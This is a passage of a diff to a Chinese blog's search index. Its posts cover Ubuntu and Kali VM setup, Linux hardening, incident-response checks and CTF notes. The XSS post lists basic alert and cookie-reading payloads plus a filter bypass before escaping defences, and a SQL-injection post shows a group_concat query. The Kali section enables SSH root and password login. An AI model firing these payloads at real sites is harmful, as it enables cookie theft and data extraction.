+    <content><![CDATA[<p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
+<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
+<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
+<p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
+<p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
+<p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>kali(Debian)虚拟机的网络配置</title>
+    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
+<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
+<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
+<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
+<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
+<p>然后配置网卡eth0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
+<p>若要设置IP为静态的，则插入以下几行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
+<p><code>:wq</code>保存退出之后，重启网卡</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
+<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
+<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
+<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
+<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
+<p>一般来说，kali默认已经安装了SSH</p>
+<p>首先查看SSH状态</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
+<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
+<p>然后修改sshd_config</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
+<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
+<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
+<p>保存退出。</p>
+<p>重启SSH服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
+<p>要使ssh开机启动，命令为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-re.d ssh enable</span><br></pre></td></tr></table></figure>
+<h2 id="代理设置"><a class="header-anchor" href="#代理设置"></a>代理设置</h2>
+<p>虚拟机想要连接外网，同样需要网络代理。如果宿主机已配置代理，那么直接让虚拟机连接主机代理上网即可。</p>
+<p>已<code>v2ray</code>为例，在参数设置-v2rayN设置中勾选<code>允许来自局域网的连接</code>。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105308512.png" style="zoom:80%;">
+<p>确定保存后，在v2ray界面底部查看代理地址</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105508684.png" alt="image-20210320105508684"></p>
+<p>返回虚拟机，设置-网络-网络代理-手动，填写你的v2ray代理地址</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/image-20210320105106748.png" style="zoom:67%;">
+<p>最后设置浏览器代理为系统代理即可。</p>
+<p>开启主机代理之后，虚拟机访问所有网站都会经过主机的代理服务器，所以在访问国内网站时可能速度较慢。</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>linux</tag>
+        <tag>kali</tag>
+        <tag>SSH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux系统加固</title>
+    <url>/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
+    <content><![CDATA[<h2 id="账号安全"><a class="header-anchor" href="#账号安全"></a>账号安全</h2>
+<p><strong>账号相关文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/passwd    -- 记录了系统中各用户的一些基本属性，root可写，所有用户可读</span><br><span class="line">/etc/shadow    -- 记录了所有用户的密码</span><br><span class="line">/etc/group     -- 记录了用户组属性</span><br><span class="line"></span><br><span class="line">1、检查是否存在除root之外UID为0的用户：</span><br><span class="line">awk -F <span class="string">':'</span> <span class="string">'($3==0)&#123;print $1&#125;'</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">2、查询可以远程登录的帐号信息</span><br><span class="line">awk <span class="string">'/\$1|\$6/&#123;print $1&#125;'</span> /etc/shadow</span><br><span class="line"></span><br><span class="line">3、除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">more /etc/sudoers | grep -v <span class="string">"^#\|^$"</span> | grep <span class="string">"ALL=(ALL)"</span></span><br><span class="line"></span><br><span class="line">4、禁用或删除多余及可疑的帐号</span><br><span class="line">usermod -L user    <span class="comment">#禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头</span></span><br><span class="line">userdel -r user    <span class="comment">#将删除user用户，并且将/home目录下的user目录一并删除</span></span><br></pre></td></tr></table></figure>
+<p><strong>修改密码策略</strong></p>
+<p>vim /etc/login.defs</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PASS_MAX_DAYS      90               密码最长有效期</span><br><span class="line">PASS_MIN_DAYS      10               密码修改之间最小的天数</span><br><span class="line">PASS_MIN_LEN       8                密码长度</span><br><span class="line">PASS_WARN_AGE      7                口令失效前多少天开始通知用户修改密码</span><br></pre></td></tr></table></figure>
+<p><strong>设置密码强度</strong></p>
+<p>vim  /etc/pam.d/common-password</p>
+<p>将原本的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password requisite  pam_cracklib.so</span><br></pre></td></tr></table></figure>
+<p>修改为至少包含一个数字、一个小写字母、一个大写字母、一个特殊字符、且密码长度&gt;=8:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password requisite  pam_cracklib.so try_first_pass retry&#x3D;3 dcredit&#x3D;-1 lcredit&#x3D;-1 ucredit&#x3D;-1 ocredit&#x3D;-1 minlen&#x3D;8</span><br></pre></td></tr></table></figure>
+<p><strong>限制用户登陆</strong></p>
+<p>vim  /etc/hosts.deny，若禁止192.168.0.1对服务器进行ssh的登陆，添加如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sshd : 192.168.0.1</span><br></pre></td></tr></table></figure>
+<p><strong>限制登陆次数</strong></p>
+<p>应对暴力破解，我们可以限制登陆次数为5，超过5次登陆失败就锁定**。**vim /etc/pam.d/sshd，在 #%PAM-1.0 的下面，加入下面的内容，表示当密码输入错误达到3次，就锁定用户150秒，如果root用户输入密码错误达到3次，锁定300秒。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth required pam_tally2.so deny&#x3D;3 unlock_time&#x3D;150 even_deny_root root_unlock_time300</span><br></pre></td></tr></table></figure>
+<p>锁定用户的管理：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pam_tally2                             查看被锁定的用户</span><br><span class="line"></span><br><span class="line">pam_tally2  --reset  -u  username      将被锁定的用户解锁</span><br></pre></td></tr></table></figure>
+<h2 id="目录-文件权限"><a class="header-anchor" href="#目录-文件权限"></a>目录&amp;文件权限</h2>
+<p><strong>存储用户信息的文件</strong></p>
+<p>在用户登陆中非常重要的三个文件</p>
+<p>/etc/passwd 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
+<p>/etc/shadow 只有root可读 –r-------- 权限值为400</p>
+<p>/etc/group 必须所有用户都可读，root用户可写 –rw-r—r— 权限值为644</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 644 &#x2F;etc&#x2F;passwd</span><br><span class="line">chmod 400 &#x2F;etc&#x2F;shadow</span><br><span class="line">chmod 644 &#x2F;etc&#x2F;group</span><br></pre></td></tr></table></figure>
+<p><strong>文件缺省权限设置</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp /etc/profile /etc/profile.bak</span><br><span class="line">vim   /etc/profile</span><br><span class="line"><span class="comment">#添加以下内容</span></span><br><span class="line"><span class="built_in">umask</span> 022	<span class="comment">#umask与文件创建后的默认所有权限异或结果即为初始权限</span></span><br><span class="line">			<span class="comment">#root创建的文件默认所有权限为666，666~022=644 (root可读可写，其他用户只可读)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行/etc/profile中的shell命令，直接执行umask命令设置的话重启失效</span></span><br><span class="line"><span class="built_in">source</span>  /etc/profile</span><br></pre></td></tr></table></figure>
+<h2 id="应用安全设置"><a class="header-anchor" href="#应用安全设置"></a>应用安全设置</h2>
+<p><strong>FTP</strong></p>
+<p>禁止匿名FTP</p>
+<p>vim  /etc/vsftpd/vsftpd.conf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anonymous_enable&#x3D;NO    #如果存在anonymous_enable则修改,如果不存在则手动增加</span><br></pre></td></tr></table></figure>
+<p><strong>SSH</strong></p>
+<ol>
+<li>在sshd_config禁止root访问和使用sshv2来让ssh更加安全</li>
+</ol>
+<p>vim /etc/ssh/sshd_config</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PermitRootLogin    no</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>设置SSH空闲超时退出时间,可降低未授权用户访问其他用户ssh会话的风险</li>
+</ol>
+<p>编辑/etc/ssh/sshd_config，将ClientAliveInterval 设置为300到900，即5-15分钟，将ClientAliveCountMax设置为0-3之间。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ClientAliveInterval 600</span><br><span class="line">ClientAliveCountMax 2</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>设置较低的Max AuthTrimes参数将降低SSH服务器被暴力攻击成功的风险</li>
+</ol>
+<p>在/etc/ssh/sshd_config中取消MaxAuthTries注释符号#，设置最大密码尝试失败次数3-6，建议为4：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MaxAuthTries 4</span><br></pre></td></tr></table></figure>
+<p><strong>TELNET</strong></p>
+<p>Telnet使用明文传输数据，存在安全隐患，应该避免使用</p>
+<p>执行如下语句，查看telnet服务是否在运行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -na | grep <span class="string">":23"</span></span><br></pre></td></tr></table></figure>
+<p>若正在运行则关闭Telnet服务，在/etc/xinetd.d/telnet中进行配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disable&#x3D;yes</span><br></pre></td></tr></table></figure>
+<h2 id="网络设置"><a class="header-anchor" href="#网络设置"></a>网络设置</h2>
+<p><strong>IPTABLES</strong></p>
+<p>根据需求合理配置防火墙</p>
+<p>比如将<code>INPUT</code>链默认规则设为<code>DROP</code>，再添加规则将需要开放的端口设置为<code>ACCEPT</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将INPUT链默认规则设置为DROP</span></span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line"></span><br><span class="line"><span class="comment">#按需添加规则使得开放端口能够接收数据包</span></span><br><span class="line"><span class="comment">#开放SSH</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#开放80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#...</span></span><br></pre></td></tr></table></figure>
+<p><strong>TCP SYN保护机制</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>“1”&gt;/proc/sys/net/ipv4/tcp_syncookies //默认为1，一般不用设置</span><br></pre></td></tr></table></figure>
+<p>表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击</p>
+]]></content>
+      <categories>
+        <category>运维</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>运维</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应急响应&amp;Linux入侵检测</title>
+    <url>/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&amp;Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</url>
+    <content><![CDATA[<h2 id="思路"><a class="header-anchor" href="#思路"></a>思路</h2>
+<h3 id="准备"><a class="header-anchor" href="#准备"></a>准备</h3>
+<p>准备检测工具和人员</p>
+<h3 id="检测与分析"><a class="header-anchor" href="#检测与分析"></a>检测与分析</h3>
+<p>紧急事件监测，包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户</p>
+<p>甚至还有管理员的报告(收到的邮件和短信)， 从这些数据中判断出受灾面积和攻击者入侵的点</p>
+<h3 id="抑制缓解"><a class="header-anchor" href="#抑制缓解"></a>抑制缓解</h3>
+<p>首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。</p>
+<h3 id="攻击根除"><a class="header-anchor" href="#攻击根除"></a>攻击根除</h3>
+<p>紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到正常水平</p>
+<h3 id="业务恢复"><a class="header-anchor" href="#业务恢复"></a>业务恢复</h3>
+<h3 id="事件跟踪"><a class="header-anchor" href="#事件跟踪"></a>事件跟踪</h3>
+<p>根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程</p>
+<h2 id="入侵排查"><a class="header-anchor" href="#入侵排查"></a>入侵排查</h2>
+<h3 id="Linux常用检查命令"><a class="header-anchor" href="#Linux常用检查命令"></a>Linux常用检查命令</h3>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>last</td>
+<td>显示的是目前与过去登入系统的用户相关信息</td>
+</tr>
+<tr>
+<td>lastlog</td>
+<td>显示所有用户的登录情况</td>
+</tr>
+<tr>
+<td>lastb</td>
+<td>显示用户错误的登录列表</td>
+</tr>
+<tr>
+<td>who</td>
+<td>显示的是当前登录的用户</td>
+</tr>
+<tr>
+<td>w</td>
+<td>比who显示多一些内容，比如用户当前执行的命令，cpu信息</td>
+</tr>
+<tr>
+<td>history</td>
+<td>查看历史命令记录</td>
+</tr>
+</tbody>
+</table>
+<h3 id="排查过程"><a class="header-anchor" href="#排查过程"></a>排查过程</h3>
+<ul>
+<li>
+<p>检查账号及登录情况</p>
+<p>见这篇文章：<a href="https://dawnyh99.github.io/2021/03/07/%E8%BF%90%E7%BB%B4/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/">Linux系统加固</a></p>
+</li>
+<li>
+<p>检查历史命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat ~/bash_history &gt;&gt; history.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>检查网络连接/开放端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看 PID 所对应的进程文件路径</span></span><br><span class="line">file /proc/<span class="variable">$PID</span>/exe</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>检查异常进程</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps aux | grep pid</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/08/%E8%BF%90%E7%BB%B4/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&Linux%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/image-20210313142418258.png" alt="image-20210313142418258"></p>
+<ul>
+<li>检查开机启动项</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /etc/init.d/</span><br><span class="line"></span><br><span class="line">ls -l /etc/rc3.d/</span><br><span class="line">ls -l /etc/rc5.d/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>检查定时任务</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -al /var/spool/cron/* </span><br><span class="line">cat /etc/crontab</span><br><span class="line">/etc/cron.d/*</span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/*</span><br><span class="line">/etc/cron.weekly/</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目录下所有文件</span></span><br><span class="line">more /etc/cron.d/*</span><br><span class="line"></span><br><span class="line">/etc/anacrontab</span><br><span class="line">/var/spool/anacron/*</span><br></pre></td></tr></table></figure>
+<ul>
+<li>检查服务</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#CentOS</span></span><br><span class="line">chkconfig  --list  <span class="comment">#查看服务自启动状态，可以看到所有的RPM包安装的服务</span></span><br><span class="line"><span class="comment">#Debian</span></span><br><span class="line">service --status-all</span><br><span class="line">systemctl list-units</span><br><span class="line"><span class="comment">#源码包安装的服务位置</span></span><br><span class="line">/usr/<span class="built_in">local</span>/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>检查异常文件</p>
+<ul>
+<li>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“…”为名的文件夹具有隐藏属性</li>
+<li>针对可疑文件可以使用<code>stat</code>查看创建修改时间</li>
+<li>发现WebShell、远控木马的创建时间</li>
+</ul>
+<p>找出同一时间范围内创建的文件？</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ./ -iname <span class="string">"*"</span> -atime 1 -<span class="built_in">type</span> f </span><br><span class="line"><span class="comment">#找出 ./ 下一天前访问过的文件</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>检查日志文件</li>
+</ul>
+<p>日志默认存放位置：/var/log/</p>
+<p>查看日志配置情况：more /etc/rsyslog.conf</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">日志文件</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">/var/log/cron</td>
+<td style="text-align:center">记录系统定时任务相关的日志</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/message</td>
+<td style="text-align:center">记录Linux操作系统常见的系统和服务错误信息(首要检查对象)</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/syslog</td>
+<td style="text-align:center">只记录警告信息，常常是系统出问题的信息</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/btmp</td>
+<td style="text-align:center">记录<strong>错误登录（登陆失败）<strong>日志；使用</strong>lastb</strong>命令查看</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>/var/log/lastlog</strong></td>
+<td style="text-align:center">记录系统中所有用户最后一次成功登录时间，使用<strong>lastlog</strong>命令查看</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>/var/log/wtmp</strong></td>
+<td style="text-align:center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件；用<strong>last</strong>命令来查看</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>/var/log/utmp</strong></td>
+<td style="text-align:center">只记录<strong>当前登录用户</strong>的信息；使用<strong>w,who,users</strong>等命令来查询</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/secure</td>
+<td style="text-align:center">记录验证和授权方面的信息，如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码</td>
+</tr>
+<tr>
+<td style="text-align:center">/var/log/apache2/error.log</td>
+<td style="text-align:center">apache错误日志，如果安装有modsecurity那么其攻击拦截日志也存在这里</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Webshell排查"><a class="header-anchor" href="#Webshell排查"></a>Webshell排查</h3>
+<p>排查工具：河马 - - <a href="https://www.shellpub.com/">https://www.shellpub.com/</a></p>
+<p>除了使用排查工具扫描，还是要手动查看Web目录下的可解析执行文件</p>
+]]></content>
+      <categories>
+        <category>运维</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+        <tag>运维</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2020/08/03/CTF/Web/XSS/</url>
+    <content><![CDATA[<h2 id="反射型XSS"><a class="header-anchor" href="#反射型XSS"></a>反射型XSS</h2>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"xss"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"#"</span> <span class="attr">onerror</span>=<span class="string">alert(/跨站/)</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">onload</span>=<span class="string">alert(/insight-labs/)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:expression(alert('xsser'))″&gt;xsser&lt;/div&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>一些绕过方法：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 空格过滤：使用左斜线/代替空格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>/<span class="attr">onload</span>=<span class="string">alert(</span>"<span class="attr">xss</span>")&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="XSS的防御"><a class="header-anchor" href="#XSS的防御"></a>XSS的防御</h2>
+<h3 id="过滤输入"><a class="header-anchor" href="#过滤输入"></a>过滤输入</h3>
+<p>对输入和URL参数进行过滤(白名单和黑名单)</p>
+<h3 id="转义输出"><a class="header-anchor" href="#转义输出"></a>转义输出</h3>
+<p><strong>1&gt;</strong> 作为body文本输出，作为html标签的属性输出：</p>
+<p>比如：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>$&#123;username&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span>,</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">c:out</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">c:out</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>此时的转义规则如下：</p>
+<p>&lt; 转成 <code>&amp;lt;</code></p>
+<p>&gt; 转成 <code>&amp;gt;</code></p>
+<p>&amp; 转成 <code>&amp;amp;</code></p>
+<p>&quot; 转成 <code>&amp;quot;</code></p>
+<p>’ 转成 <code>&amp;#39;</code></p>
+<p><strong>2&gt;</strong> javascript事件</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">"button"</span> onclick=<span class="string">'go_to_url("$&#123;myUrl&#125;");'</span> /&gt;</span><br></pre></td></tr></table></figure>
+<p>除了上面的那些转义之外，还要附加上下面的转义：</p>
+<p>\ 转成<code>\\</code></p>
+<p>/ 转成 <code>\/</code></p>
+<p>; 转成 <code>；</code>(全角分号)</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="基础"><a class="header-anchor" href="#基础"></a>基础</h2>
+<h3 id="常见问题"><a class="header-anchor" href="#常见问题"></a>常见问题</h3>
+<ol>
+<li>
+<p>查询表中的所有记录，但页面只返回1条（前几条）怎么办？</p>
+<p>使用字符串连接函数：<code>concat()</code> , <code>concat_ws()</code> , <code>group_concat()</code> 等将多条记录的某个字段合并成一个字符串</p>
+<p>eg:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">name</span>) <span class="keyword">from</span> security.user;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/10/CTF/Web/sql%E6%B3%A8%E5%85%A5/image-20200810162953419.png" alt="image-20200810162953419"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>sqli</tag>
+      </tags>
+  </entry>
+  <entry>
